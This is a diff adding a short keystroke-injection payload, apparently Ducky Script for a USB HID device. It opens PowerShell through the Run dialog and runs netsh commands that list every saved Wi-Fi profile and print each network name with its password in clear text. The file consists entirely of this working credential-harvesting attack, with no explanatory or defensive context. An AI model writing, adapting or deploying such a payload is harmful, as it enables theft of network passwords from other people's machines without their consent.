@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "All User Profile\s+:\s+", "" }
+ENTER
+STRING foreach ($profile in $wifiProfiles) { $ssid = $profile.Trim(); $profileInfo = netsh wlan show profile name="$ssid" key=clear; $password = $profileInfo | Select-String "Key Content" | ForEach-Object { $_ -replace "Key Content\s+:\s+", "" }; Write-Output "$ssid=$password" }
+ENTER
